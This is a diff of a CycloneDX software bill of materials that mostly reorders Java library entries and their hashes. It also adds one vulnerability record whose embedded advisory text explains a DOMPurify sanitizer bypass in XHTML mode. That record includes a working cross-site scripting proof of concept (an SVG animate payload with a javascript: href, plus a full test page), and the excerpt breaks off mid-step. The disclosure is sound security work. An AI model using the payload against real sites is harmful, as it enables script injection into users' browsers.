@@ -1,10 +1,10 @@
 {
   "bomFormat": "CycloneDX",
   "specVersion": "1.5",
-  "serialNumber": "urn:uuid:dc375759-e707-490a-9c90-b32dde9e15a8",
+  "serialNumber": "urn:uuid:6931c350-c4da-4f27-a59e-664dbd7dbd5f",
   "version": 1,
   "metadata": {
-    "timestamp": "2026-10-22T16:32:43Z",
+    "timestamp": "2026-10-23T17:20:30Z",
     "tools": {
       "components": [
         {
@@ -371,56 +371,6 @@
     },
     {
       "type": "library",
-      "bom-ref": "e14022de-03f9-4242-a932-d139876cd47b",
-      "group": "org.apache.cxf",
-      "name": "cxf-core",
-      "version": "4.2.1",
-      "scope": "required",
-      "hashes": [
-        {
-          "alg": "MD5",
-          "content": "1ed2477d4c09c30c1aaf52efe2146307"
-        },
-        {
-          "alg": "SHA-1",
-          "content": "a7c380958fba9e3a55b874ae8085937d7fde2375"
-        },
-        {
-          "alg": "SHA-256",
-          "content": "b31c913083d36d5369b532a39a94a7e06d8e0d50d27d09c2f3824e73f4e5b90a"
-        },
-        {
-          "alg": "SHA-384",
-          "content": "e083e29165e5375a62ffa3de7c58696dc017e2bfc0d6ae013de868a4d7164c3244e6e34cb932b0ebf32f0a9864b6e8b7"
-        },
-        {
-          "alg": "SHA-512",
-          "content": "928c3906203ea140c6fe8c7215a3475dc57495e7c9769788a1750e3133e6945353d1c6fef97dec62e540d14ac86b502da193a17ff88a90a31d183c6b68dfe0eb"
-        },
-        {
-          "alg": "SHA3-256",
-          "content": "ea903523b4da80a809c212313603ba48a68e9c3908f4c7400bdff9e23e338d1e"
-        },
-        {
-          "alg": "SHA3-512",
-          "content": "7dd9418e155c5e4f62fff208a4211a986eff809a97ddd33e19a0a928bb7b2fae33eaf68be92b60f329f978b75177a4c143f500806080f9ce9fe52d87e028c6cf"
-        },
-        {
-          "alg": "SHA3-384",
-          "content": "c317aca7bcad4defdb9473396f69f733603ca4d0cf30b07f4534d7e6cc02bf7c8b12183c5e60cf75b1d07459d94ab38b"
-        }
-      ],
-      "cpe": "cpe:2.3:a:apache:cxf:4.2.1:*:*:*:*:*:*:*",
-      "purl": "pkg:maven/org.apache.cxf/cxf-core@4.2.1?type=bundle",
-      "externalReferences": [
-        {
-          "type": "website",
-          "url": "https://cxf.apache.org"
-        }
-      ]
-    },
-    {
-      "type": "library",
       "bom-ref": "4bab9e3a-d5f6-4239-bc55-c11a7fdf2144",
       "group": "org.apache.cxf",
       "name": "cxf-core",
@@ -488,6 +438,56 @@
     },
     {
       "type": "library",
+      "bom-ref": "e14022de-03f9-4242-a932-d139876cd47b",
+      "group": "org.apache.cxf",
+      "name": "cxf-core",
+      "version": "4.2.1",
+      "scope": "required",
+      "hashes": [
+        {
+          "alg": "MD5",
+          "content": "1ed2477d4c09c30c1aaf52efe2146307"
+        },
+        {
+          "alg": "SHA-1",
+          "content": "a7c380958fba9e3a55b874ae8085937d7fde2375"
+        },
+        {
+          "alg": "SHA-256",
+          "content": "b31c913083d36d5369b532a39a94a7e06d8e0d50d27d09c2f3824e73f4e5b90a"
+        },
+        {
+          "alg": "SHA-384",
+          "content": "e083e29165e5375a62ffa3de7c58696dc017e2bfc0d6ae013de868a4d7164c3244e6e34cb932b0ebf32f0a9864b6e8b7"
+        },
+        {
+          "alg": "SHA-512",
+          "content": "928c3906203ea140c6fe8c7215a3475dc57495e7c9769788a1750e3133e6945353d1c6fef97dec62e540d14ac86b502da193a17ff88a90a31d183c6b68dfe0eb"
+        },
+        {
+          "alg": "SHA3-256",
+          "content": "ea903523b4da80a809c212313603ba48a68e9c3908f4c7400bdff9e23e338d1e"
+        },
+        {
+          "alg": "SHA3-512",
+          "content": "7dd9418e155c5e4f62fff208a4211a986eff809a97ddd33e19a0a928bb7b2fae33eaf68be92b60f329f978b75177a4c143f500806080f9ce9fe52d87e028c6cf"
+        },
+        {
+          "alg": "SHA3-384",
+          "content": "c317aca7bcad4defdb9473396f69f733603ca4d0cf30b07f4534d7e6cc02bf7c8b12183c5e60cf75b1d07459d94ab38b"
+        }
+      ],
+      "cpe": "cpe:2.3:a:apache:cxf:4.2.1:*:*:*:*:*:*:*",
+      "purl": "pkg:maven/org.apache.cxf/cxf-core@4.2.1?type=bundle",
+      "externalReferences": [
+        {
+          "type": "website",
+          "url": "https://cxf.apache.org"
+        }
+      ]
+    },
+    {
+      "type": "library",
       "bom-ref": "00b75305-3e7c-4346-8cba-4715894e797b",
       "author": "Dr.-Ing. Mario Heiderich, Cure53",
       "name": "dompurify",
@@ -526,6 +526,63 @@
         {
           "name": "cdx:npm:package:path",
           "value": "node_modules/dompurify"
+        }
+      ]
+    },
+    {
+      "type": "library",
+      "bom-ref": "cc6a99f8-bd3e-4f30-ba4d-f3814d0756bd",
+      "group": "org.freemarker",
+      "name": "freemarker",
+      "version": "2.3.34",
+      "scope": "required",
+      "hashes": [
+        {
+          "alg": "MD5",
+          "content": "1704fd3c579385ca5fd0ebcdf50df73c"
+        },
+        {
+          "alg": "SHA-1",
+          "content": "c2fa47a1c3b6dcdfca90e952e51211967a4baa54"
+        },
+        {
+          "alg": "SHA-256",
+          "content": "9a9fb91cd64199232eb1ca9766148a5d30ef8944be5fac051018f96c70c8f6a3"
+        },
+        {
+          "alg": "SHA-384",
+          "content": "3def74003978738e770a121746f2fd5b3f179f117050fac529ba9a6eee104ac7d20f74a1e815f97a5bf451b3f36f0ed1"
+        },
+        {
+          "alg": "SHA-512",
+          "content": "58bc6e157452f6b3a70a7d1bcfb89013e7204e716e267386014f6834fb66a56333fe4b538ef25b651913ab585bfa5c8fa010159d96ab952de42a82edb9552fca"
+        },
+        {
+          "alg": "SHA3-256",
+          "content": "22113afa6de5d146e0be2840ffd3103323b87849f020b06f24d9a70f3dfd3571"
+        },
+        {
+          "alg": "SHA3-512",
+          "content": "69c49e3ffb693fbeb98515f578c5a1bf1a6f81baf04efb21d8b2cdcbe93d59eff28f3e6d82a785c9c5b27222fc6f1bfa16a33bc08c92ea792a26a5d1b6068df9"
+        },
+        {
+          "alg": "SHA3-384",
+          "content": "5636e107cd5406439d57e41ebcfa3cb068e32639941f1b7d780efb5acdb50ee99f7966b9174c52e9cfb27de22666fec6"
+        }
+      ],
+      "licenses": [
+        {
+          "license": {
+            "id": "Apache-2.0",
+            "url": "http://www.apache.org/licenses/LICENSE-2.0.txt"
+          }
+        }
+      ],
+      "purl": "pkg:maven/org.freemarker/freemarker@2.3.34",
+      "externalReferences": [
+        {
+          "type": "website",
+          "url": "https://freemarker.apache.org/"
         }
       ]
     },
@@ -600,58 +657,58 @@
     },
     {
       "type": "library",
-      "bom-ref": "cc6a99f8-bd3e-4f30-ba4d-f3814d0756bd",
-      "group": "org.freemarker",
-      "name": "freemarker",
-      "version": "2.3.34",
+      "bom-ref": "8f28cefb-3058-4c98-972d-d99e88a523e4",
+      "group": "com.fasterxml.jackson.core",
+      "name": "jackson-core",
+      "version": "2.21.3",
       "scope": "required",
       "hashes": [
         {
           "alg": "MD5",
-          "content": "1704fd3c579385ca5fd0ebcdf50df73c"
+          "content": "513c4f2160300c336a02bb13592d0d98"
         },
         {
           "alg": "SHA-1",
-          "content": "c2fa47a1c3b6dcdfca90e952e51211967a4baa54"
+          "content": "3358e9345dd0f2537c47bee152c0377df6c81ad5"
         },
         {
           "alg": "SHA-256",
-          "content": "9a9fb91cd64199232eb1ca9766148a5d30ef8944be5fac051018f96c70c8f6a3"
+          "content": "baf8b739e9d9b93bcdb33f25046bfdb8dbd74c97de2a8698539fbe0c7eeac0bb"
         },
         {
           "alg": "SHA-384",
-          "content": "3def74003978738e770a121746f2fd5b3f179f117050fac529ba9a6eee104ac7d20f74a1e815f97a5bf451b3f36f0ed1"
+          "content": "7a6d40916c50e4c8f3471cf21ef9d123c38757387e98c5c209fac558b976e8628f343f1629a7903ebc428a724581e639"
         },
         {
           "alg": "SHA-512",
-          "content": "58bc6e157452f6b3a70a7d1bcfb89013e7204e716e267386014f6834fb66a56333fe4b538ef25b651913ab585bfa5c8fa010159d96ab952de42a82edb9552fca"
+          "content": "3b1140a023f12df08e891aa1d623d01c79d1932d310cc90907603103abf1d5b1b288eba45c45a3fd292f44642d042c541ec50a17be4c6c8ec6a2e6cc6a1644d6"
         },
         {
           "alg": "SHA3-256",
-          "content": "22113afa6de5d146e0be2840ffd3103323b87849f020b06f24d9a70f3dfd3571"
+          "content": "04754d7de00152f4923b4053603280bc5d88117a6e4e4257809f705b4014a321"
         },
         {
           "alg": "SHA3-512",
-          "content": "69c49e3ffb693fbeb98515f578c5a1bf1a6f81baf04efb21d8b2cdcbe93d59eff28f3e6d82a785c9c5b27222fc6f1bfa16a33bc08c92ea792a26a5d1b6068df9"
+          "content": "56e4801e9037f7ec12ae63ac581a71cac68e2eada3723f0a834af65ff18c852350fe13486ea4458c314861455c58d79f0329eab32f9e35778ee330f879a43c22"
         },
         {
           "alg": "SHA3-384",
-          "content": "5636e107cd5406439d57e41ebcfa3cb068e32639941f1b7d780efb5acdb50ee99f7966b9174c52e9cfb27de22666fec6"
+          "content": "d090d6e06798b7ad7db8aa5a481d36ef8bccb38c1b026af34936d5182963e4a30db88e15ccbf3a24a45cdfd613d03d10"
         }
       ],
       "licenses": [
         {
           "license": {
             "id": "Apache-2.0",
-            "url": "http://www.apache.org/licenses/LICENSE-2.0.txt"
+            "url": "https://www.apache.org/licenses/LICENSE-2.0.txt"
           }
         }
       ],
-      "purl": "pkg:maven/org.freemarker/freemarker@2.3.34",
+      "purl": "pkg:maven/com.fasterxml.jackson.core/jackson-core@2.21.3",
       "externalReferences": [
         {
           "type": "website",
-          "url": "https://freemarker.apache.org/"
+          "url": "https://github.com/FasterXML/jackson-core"
         }
       ]
     },
@@ -722,43 +779,43 @@
     },
     {
       "type": "library",
-      "bom-ref": "8f28cefb-3058-4c98-972d-d99e88a523e4",
+      "bom-ref": "ad9114b5-4107-418c-9676-5f46ab61304a",
       "group": "com.fasterxml.jackson.core",
-      "name": "jackson-core",
+      "name": "jackson-databind",
       "version": "2.21.3",
       "scope": "required",
       "hashes": [
         {
           "alg": "MD5",
-          "content": "513c4f2160300c336a02bb13592d0d98"
+          "content": "0ae595293418fd4dd9c4527d4abc5610"
         },
         {
           "alg": "SHA-1",
-          "content": "3358e9345dd0f2537c47bee152c0377df6c81ad5"
+          "content": "aa7ccec161c275f3e6332666ab758916f3120714"
         },
         {
           "alg": "SHA-256",
-          "content": "baf8b739e9d9b93bcdb33f25046bfdb8dbd74c97de2a8698539fbe0c7eeac0bb"
+          "content": "f397563d8e67630c10cab8c2334ca0e55af832fa3ebde160a379c2c96d43bf25"
         },
         {
           "alg": "SHA-384",
-          "content": "7a6d40916c50e4c8f3471cf21ef9d123c38757387e98c5c209fac558b976e8628f343f1629a7903ebc428a724581e639"
+          "content": "47cf817512cd1482eeaa54ae68e62d3b13eafa11546d99ee933de28a9514f4a41e967fa378b40b17746bc98a26f7b387"
         },
         {
           "alg": "SHA-512",
-          "content": "3b1140a023f12df08e891aa1d623d01c79d1932d310cc90907603103abf1d5b1b288eba45c45a3fd292f44642d042c541ec50a17be4c6c8ec6a2e6cc6a1644d6"
+          "content": "bf9df0232bd26b6f00b2227fad26cee40ef31e8e12e521ee1afe89dcea61ddb2b27cbc0d1f0679d1746cc35cc361e531c84324db68d43eaa60f15933bbbcf0ab"
         },
         {
           "alg": "SHA3-256",
-          "content": "04754d7de00152f4923b4053603280bc5d88117a6e4e4257809f705b4014a321"
+          "content": "f506e6ef4e26c5720065231dc654a0a99beb2e195e98e32fb5ad02ab4386e20b"
         },
         {
           "alg": "SHA3-512",
-          "content": "56e4801e9037f7ec12ae63ac581a71cac68e2eada3723f0a834af65ff18c852350fe13486ea4458c314861455c58d79f0329eab32f9e35778ee330f879a43c22"
+          "content": "a73c9798fa53f62bec6ca46cf8ad264d78b0a41ab9089ad8b8f4bfb8034d8eea8081bbcf3e2a9a3ac5ea018c13710098c6b1af033c088cec2385ccd62c1b84c0"
         },
         {
           "alg": "SHA3-384",
-          "content": "d090d6e06798b7ad7db8aa5a481d36ef8bccb38c1b026af34936d5182963e4a30db88e15ccbf3a24a45cdfd613d03d10"
+          "content": "d0a2f03bf3223f5ad6d84541f1027f56045689ec54dc8c594db9dc11d50c041d8487b1abcaf107b05da886f2b988c628"
         }
       ],
       "licenses": [
@@ -769,11 +826,11 @@
           }
         }
       ],
-      "purl": "pkg:maven/com.fasterxml.jackson.core/jackson-core@2.21.3",
+      "purl": "pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.3",
       "externalReferences": [
         {
           "type": "website",
-          "url": "https://github.com/FasterXML/jackson-core"
+          "url": "https://github.com/FasterXML/jackson"
         }
       ]
     },
@@ -839,63 +896,6 @@
         {
           "type": "vcs",
           "url": "https://github.com/FasterXML/jackson-databind"
-        }
-      ]
-    },
-    {
-      "type": "library",
-      "bom-ref": "ad9114b5-4107-418c-9676-5f46ab61304a",
-      "group": "com.fasterxml.jackson.core",
-      "name": "jackson-databind",
-      "version": "2.21.3",
-      "scope": "required",
-      "hashes": [
-        {
-          "alg": "MD5",
-          "content": "0ae595293418fd4dd9c4527d4abc5610"
-        },
-        {
-          "alg": "SHA-1",
-          "content": "aa7ccec161c275f3e6332666ab758916f3120714"
-        },
-        {
-          "alg": "SHA-256",
-          "content": "f397563d8e67630c10cab8c2334ca0e55af832fa3ebde160a379c2c96d43bf25"
-        },
-        {
-          "alg": "SHA-384",
-          "content": "47cf817512cd1482eeaa54ae68e62d3b13eafa11546d99ee933de28a9514f4a41e967fa378b40b17746bc98a26f7b387"
-        },
-        {
-          "alg": "SHA-512",
-          "content": "bf9df0232bd26b6f00b2227fad26cee40ef31e8e12e521ee1afe89dcea61ddb2b27cbc0d1f0679d1746cc35cc361e531c84324db68d43eaa60f15933bbbcf0ab"
-        },
-        {
-          "alg": "SHA3-256",
-          "content": "f506e6ef4e26c5720065231dc654a0a99beb2e195e98e32fb5ad02ab4386e20b"
-        },
-        {
-          "alg": "SHA3-512",
-          "content": "a73c9798fa53f62bec6ca46cf8ad264d78b0a41ab9089ad8b8f4bfb8034d8eea8081bbcf3e2a9a3ac5ea018c13710098c6b1af033c088cec2385ccd62c1b84c0"
-        },
-        {
-          "alg": "SHA3-384",
-          "content": "d0a2f03bf3223f5ad6d84541f1027f56045689ec54dc8c594db9dc11d50c041d8487b1abcaf107b05da886f2b988c628"
-        }
-      ],
-      "licenses": [
-        {
-          "license": {
-            "id": "Apache-2.0",
-            "url": "https://www.apache.org/licenses/LICENSE-2.0.txt"
-          }
-        }
-      ],
-      "purl": "pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.3",
-      "externalReferences": [
-        {
-          "type": "website",
-          "url": "https://github.com/FasterXML/jackson"
         }
       ]
     },
@@ -1054,6 +1054,63 @@
     },
     {
       "type": "library",
+      "bom-ref": "0261ac8b-674e-425b-be06-57c0804ab895",
+      "group": "org.jsoup",
+      "name": "jsoup",
+      "version": "1.15.4",
+      "scope": "required",
+      "hashes": [
+        {
+          "alg": "MD5",
+          "content": "642bc7d013d5c950fbdf90d9bfffc246"
+        },
+        {
+          "alg": "SHA-1",
+          "content": "cd56eb47dcd4590ef6451f87e5ec33bddd1a9a51"
+        },
+        {
+          "alg": "SHA-256",
+          "content": "006830d0797710408de5589c18d864343c0ef1a3a0c603c9cb138c943b67d9a4"
+        },
+        {
+          "alg": "SHA-384",
+          "content": "fa81a6f2bd9e26b224cc646789e277e24cf2a2cbd28f8d1ca1c3c3c4ef902c30d1382bfb4740de32214cd23c5bb92898"
+        },
+        {
+          "alg": "SHA-512",
+          "content": "bd36ea804bd42c89c2fef8dae5dec1e4bb81c339d5994fbfbc6b9bed547ad258ae130d723659aa5ffffe7ed9d0957cc022df67ab56ab13385ee621b03d51569e"
+        },
+        {
+          "alg": "SHA3-256",
+          "content": "026debe59b49c73968281c2f4097919a0c0d9cd7308ab957953bcbf12514af2a"
+        },
+        {
+          "alg": "SHA3-512",
+          "content": "968e86134f47cb93258b51bf599e7e44f18436c57b2eb7146c298e7c27867f366ea9f7f6b0c37ab201720b4bee8ed88fd702a8363201e91811a951c1c95afa10"
+        },
+        {
+          "alg": "SHA3-384",
+          "content": "1f45d1fd18e44051320a55bbdfb754170fd4d38d4f950a441ab7a76bd5a58a5c6172729d384f42922bd6542a96c521b9"
+        }
+      ],
+      "licenses": [
+        {
+          "license": {
+            "name": "The MIT License",
+            "url": "https://jsoup.org/license"
+          }
+        }
+      ],
+      "purl": "pkg:maven/org.jsoup/jsoup@1.15.4",
+      "externalReferences": [
+        {
+          "type": "website",
+          "url": "https://jsoup.org/"
+        }
+      ]
+    },
+    {
+      "type": "library",
       "bom-ref": "8c00a4f3-6c4c-4fbc-97b6-0817bb6ed708",
       "group": "org.jsoup",
       "name": "jsoup",
@@ -1114,63 +1171,6 @@
         {
           "type": "vcs",
           "url": "https://github.com/jhy/jsoup"
-        }
-      ]
-    },
-    {
-      "type": "library",
-      "bom-ref": "0261ac8b-674e-425b-be06-57c0804ab895",
-      "group": "org.jsoup",
-      "name": "jsoup",
-      "version": "1.15.4",
-      "scope": "required",
-      "hashes": [
-        {
-          "alg": "MD5",
-          "content": "642bc7d013d5c950fbdf90d9bfffc246"
-        },
-        {
-          "alg": "SHA-1",
-          "content": "cd56eb47dcd4590ef6451f87e5ec33bddd1a9a51"
-        },
-        {
-          "alg": "SHA-256",
-          "content": "006830d0797710408de5589c18d864343c0ef1a3a0c603c9cb138c943b67d9a4"
-        },
-        {
-          "alg": "SHA-384",
-          "content": "fa81a6f2bd9e26b224cc646789e277e24cf2a2cbd28f8d1ca1c3c3c4ef902c30d1382bfb4740de32214cd23c5bb92898"
-        },
-        {
-          "alg": "SHA-512",
-          "content": "bd36ea804bd42c89c2fef8dae5dec1e4bb81c339d5994fbfbc6b9bed547ad258ae130d723659aa5ffffe7ed9d0957cc022df67ab56ab13385ee621b03d51569e"
-        },
-        {
-          "alg": "SHA3-256",
-          "content": "026debe59b49c73968281c2f4097919a0c0d9cd7308ab957953bcbf12514af2a"
-        },
-        {
-          "alg": "SHA3-512",
-          "content": "968e86134f47cb93258b51bf599e7e44f18436c57b2eb7146c298e7c27867f366ea9f7f6b0c37ab201720b4bee8ed88fd702a8363201e91811a951c1c95afa10"
-        },
-        {
-          "alg": "SHA3-384",
-          "content": "1f45d1fd18e44051320a55bbdfb754170fd4d38d4f950a441ab7a76bd5a58a5c6172729d384f42922bd6542a96c521b9"
-        }
-      ],
-      "licenses": [
-        {
-          "license": {
-            "name": "The MIT License",
-            "url": "https://jsoup.org/license"
-          }
-        }
-      ],
-      "purl": "pkg:maven/org.jsoup/jsoup@1.15.4",
-      "externalReferences": [
-        {
-          "type": "website",
-          "url": "https://jsoup.org/"
         }
       ]
     },
@@ -1676,56 +1676,6 @@
     },
     {
       "type": "library",
-      "bom-ref": "58be0721-d624-4434-aee3-f8af67dfb270",
-      "group": "org.apache.neethi",
-      "name": "neethi",
-      "version": "3.2.2",
-      "scope": "required",
-      "hashes": [
-        {
-          "alg": "MD5",
-          "content": "f4180d706474f28c05e5216d4b0b8b14"
-        },
-        {
-          "alg": "SHA-1",
-          "content": "1051f0f8916f832d0e76623d851e6afa6cc06064"
-        },
-        {
-          "alg": "SHA-256",
-          "content": "b9385bb64ea84f1f42035c4926f3ff90aff9b995463a8ae7b6a61211f9e1a8e3"
-        },
-        {
-          "alg": "SHA-384",
-          "content": "e7cc17208c3b160783c36675199e66e06321715c1b78802a84e6a28efe120ffcab56c6dfa93eca6765ff94c785b01750"
-        },
-        {
-          "alg": "SHA-512",
-          "content": "f2b1e150a851bcc8c99b1428f149ff6b104edc67a117ef8439888e9ae905d0f8a0cd20d3e7fec815f0b64f3891b85076f04443c5de63053db63b10a7f5adbad4"
-        },
-        {
-          "alg": "SHA3-256",
-          "content": "c695b229401dd5effb3cbeed6347b88ae4b9ee4b6f76776b7e4f4204a4ad9ef3"
-        },
-        {
-          "alg": "SHA3-512",
-          "content": "bd2959122c00db1693186594610a44bd2a5a51ebbb737a35f143a1abe09eae31e9bb0efdee6b7aeecd44cce53384aec137cd698a4193518eb749a9dcd9745f0d"
-        },
-        {
-          "alg": "SHA3-384",
-          "content": "7069f409132ef125b2daf8359ac6f9e2ba829b1af73b214268a6bd1ff94309bf9e1e6b66d58c51d3b564c842ff83f1bc"
-        }
-      ],
-      "cpe": "cpe:2.3:a:apache:neethi:3.2.2:*:*:*:*:*:*:*",
-      "purl": "pkg:maven/org.apache.neethi/neethi@3.2.2?type=bundle",
-      "externalReferences": [
-        {
-          "type": "website",
-          "url": "https://ws.apache.org/neethi/"
-        }
-      ]
-    },
-    {
-      "type": "library",
       "bom-ref": "14d7f2f9-0c07-420d-8c41-4951d33b6ee5",
       "group": "org.apache.neethi",
       "name": "neethi",
@@ -1784,6 +1734,56 @@
         {
           "type": "vcs",
           "url": "https://gitbox.apache.org/repos/asf?p=ws-neethi.git;a=summary"
+        }
+      ]
+    },
+    {
+      "type": "library",
+      "bom-ref": "58be0721-d624-4434-aee3-f8af67dfb270",
+      "group": "org.apache.neethi",
+      "name": "neethi",
+      "version": "3.2.2",
+      "scope": "required",
+      "hashes": [
+        {
+          "alg": "MD5",
+          "content": "f4180d706474f28c05e5216d4b0b8b14"
+        },
+        {
+          "alg": "SHA-1",
+          "content": "1051f0f8916f832d0e76623d851e6afa6cc06064"
+        },
+        {
+          "alg": "SHA-256",
+          "content": "b9385bb64ea84f1f42035c4926f3ff90aff9b995463a8ae7b6a61211f9e1a8e3"
+        },
+        {
+          "alg": "SHA-384",
+          "content": "e7cc17208c3b160783c36675199e66e06321715c1b78802a84e6a28efe120ffcab56c6dfa93eca6765ff94c785b01750"
+        },
+        {
+          "alg": "SHA-512",
+          "content": "f2b1e150a851bcc8c99b1428f149ff6b104edc67a117ef8439888e9ae905d0f8a0cd20d3e7fec815f0b64f3891b85076f04443c5de63053db63b10a7f5adbad4"
+        },
+        {
+          "alg": "SHA3-256",
+          "content": "c695b229401dd5effb3cbeed6347b88ae4b9ee4b6f76776b7e4f4204a4ad9ef3"
+        },
+        {
+          "alg": "SHA3-512",
+          "content": "bd2959122c00db1693186594610a44bd2a5a51ebbb737a35f143a1abe09eae31e9bb0efdee6b7aeecd44cce53384aec137cd698a4193518eb749a9dcd9745f0d"
+        },
+        {
+          "alg": "SHA3-384",
+          "content": "7069f409132ef125b2daf8359ac6f9e2ba829b1af73b214268a6bd1ff94309bf9e1e6b66d58c51d3b564c842ff83f1bc"
+        }
+      ],
+      "cpe": "cpe:2.3:a:apache:neethi:3.2.2:*:*:*:*:*:*:*",
+      "purl": "pkg:maven/org.apache.neethi/neethi@3.2.2?type=bundle",
+      "externalReferences": [
+        {
+          "type": "website",
+          "url": "https://ws.apache.org/neethi/"
         }
       ]
     },
@@ -2620,15 +2620,15 @@
       ]
     },
     {
-      "ref": "e14022de-03f9-4242-a932-d139876cd47b",
-      "dependsOn": [
-        "a16e516b-e128-4075-86b9-2e631068a659"
-      ]
-    },
-    {
       "ref": "4bab9e3a-d5f6-4239-bc55-c11a7fdf2144",
       "dependsOn": [
         "ccdd1d20-9f3f-4030-96ae-c54e60a0eb60"
+      ]
+    },
+    {
+      "ref": "e14022de-03f9-4242-a932-d139876cd47b",
+      "dependsOn": [
+        "a16e516b-e128-4075-86b9-2e631068a659"
       ]
     },
     {
@@ -2636,15 +2636,11 @@
       "dependsOn": []
     },
     {
-      "ref": "6b027965-5e08-4f80-9e82-fda4c6e0cd3d",
-      "dependsOn": []
-    },
-    {
       "ref": "cc6a99f8-bd3e-4f30-ba4d-f3814d0756bd",
       "dependsOn": []
     },
     {
-      "ref": "873befad-9ddb-44e4-ae22-db4ff88ae4cd",
+      "ref": "6b027965-5e08-4f80-9e82-fda4c6e0cd3d",
       "dependsOn": []
     },
     {
@@ -2652,15 +2648,19 @@
       "dependsOn": []
     },
     {
-      "ref": "a79ef98f-1560-417a-9365-b84834eca11b",
-      "dependsOn": [
-        "873befad-9ddb-44e4-ae22-db4ff88ae4cd"
-      ]
+      "ref": "873befad-9ddb-44e4-ae22-db4ff88ae4cd",
+      "dependsOn": []
     },
     {
       "ref": "ad9114b5-4107-418c-9676-5f46ab61304a",
       "dependsOn": [
         "8f28cefb-3058-4c98-972d-d99e88a523e4"
+      ]
+    },
+    {
+      "ref": "a79ef98f-1560-417a-9365-b84834eca11b",
+      "dependsOn": [
+        "873befad-9ddb-44e4-ae22-db4ff88ae4cd"
       ]
     },
     {
@@ -2678,11 +2678,11 @@
       "dependsOn": []
     },
     {
-      "ref": "8c00a4f3-6c4c-4fbc-97b6-0817bb6ed708",
+      "ref": "0261ac8b-674e-425b-be06-57c0804ab895",
       "dependsOn": []
     },
     {
-      "ref": "0261ac8b-674e-425b-be06-57c0804ab895",
+      "ref": "8c00a4f3-6c4c-4fbc-97b6-0817bb6ed708",
       "dependsOn": []
     },
     {
@@ -2727,11 +2727,11 @@
       "dependsOn": []
     },
     {
-      "ref": "58be0721-d624-4434-aee3-f8af67dfb270",
+      "ref": "14d7f2f9-0c07-420d-8c41-4951d33b6ee5",
       "dependsOn": []
     },
     {
-      "ref": "14d7f2f9-0c07-420d-8c41-4951d33b6ee5",
+      "ref": "58be0721-d624-4434-aee3-f8af67dfb270",
       "dependsOn": []
     },
     {
@@ -8757,6 +8757,74 @@
         "state": "not_affected",
         "justification": "code_not_present",
         "detail": "Affects a transitive dependency that is non-exploitable in this case."
+      },
+      "affects": [
+        {
+          "ref": "00b75305-3e7c-4346-8cba-4715894e797b"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-c6gr-qvv4-5v3f",
+      "source": {
+        "name": "GITHUB",
+        "url": "https://github.com/advisories"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "GITHUB",
+            "url": "https://github.com/advisories"
+          },
+          "severity": "low",
+          "method": "other"
+        }
+      ],
+      "cwes": [
+        79
+      ],
+      "description": "### Summary\n\nDOMPurify drops `attributeName` attributes whose value contains `href`, so an allowed `<animate>` or `<set>` can't rewrite a link's href after sanitizing. The check compares the attribute name after `transformCaseFunc`, and that function doesn't lowercase in XHTML mode. In XHTML the attribute is spelled `attributeName`, so the comparison with `\"attributename\"` never matches and the guard does nothing.\n\nAn app that uses `PARSER_MEDIA_TYPE: 'application/xhtml+xml'` and allows `animate` and `attributeName` will keep `<animate attributeName=\"href\" values=\"x;javascript:alert(1)\">`. Clicking the parent link then runs the script.\n\nThis needs a non-default config, so going by SECURITY.md, this is a hardening bug rather than a bypass of the default config.\n\n### Details\n\nIn `_sanitizeAttributes` (dist/purify.js line 2216 in 3.4.16):\n\n```js\nconst lcName = transformCaseFunc(name);\n...\nif (lcName === \"attributename\" && stringMatch(value, \"href\")) {\n  _removeAttribute(name, currentNode, attr);\n  continue;\n}\n```\n\n`transformCaseFunc` is `stringToLowerCase` for text/html but the identity function for application/xhtml+xml, because XML names are case-sensitive. The XML parser keeps SVG's real name `attributeName`, so in XHTML mode `lcName` is `attributeName` and the branch never runs.\n\nPeople using XHTML mode have to list SVG attributes in camelCase. The built-in attribute lists are lowercase and won't match, so `ALLOWED_ATTR`/`ADD_ATTR: ['attributeName', ...]` is the config you'd naturally write here.\n\nThe value also passes the URI check. `IS_ALLOWED_URI` only checks the start of the string, and `x;javascript:alert(1)` looks like a relative value. SMIL reads `values` as a `;` list and, with `fill=\"freeze\"`, the last entry ends up as the effective href of the parent `<a>`.\n\nIn text/html mode the same allowlist is handled correctly. The name is lowercased and `attributeName` is removed.\n\nThis is close to the XHTML case-sensitivity hardening in 3.4.14/3.4.15 (Attack Classes & Bypass History §22): a check written for lowercase names that a case-preserved name gets past.\n\n### Proof of concept\n\nTested with DOMPurify 3.4.16 in Chrome 153 (headless shell). Also reproduced on 3.3.3, 3.3.1 and 3.2.7. Not confirmed for 2.x.\n\nConfig:\n\n```js\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\n```\n\n`{ PARSER_MEDIA_TYPE: 'application/xhtml+xml', USE_PROFILES: { svg: true }, ADD_TAGS: ['animate'], ADD_ATTR: ['attributeName'] }` behaves the same.\n\nInput:\n\n```html\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"><a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/><text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>\n```\n\nSteps:\n\n1. Save this as `poc.xhtml` next to `purify.js` (3.4.16) and open it in Chrome. The `.xhtml` extension makes Chrome load it as application/xhtml+xml, so nothing moves between HTML and XHTML.\n\n```html\n<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>poc</title>\n<script src=\"purify.js\"></script></head><body><div id=\"sink\"></div>\n<script>//<![CDATA[\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\nconst dirty = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"><a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/><text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>';\nconst clean = DOMPurify.sanitize(dirty, cfg);\nconsole.log(clean);\ndocument.getElementById('sink').innerHTML = clean;\n//]]></script></body></html>\n```\n\n2. The logged output still contains 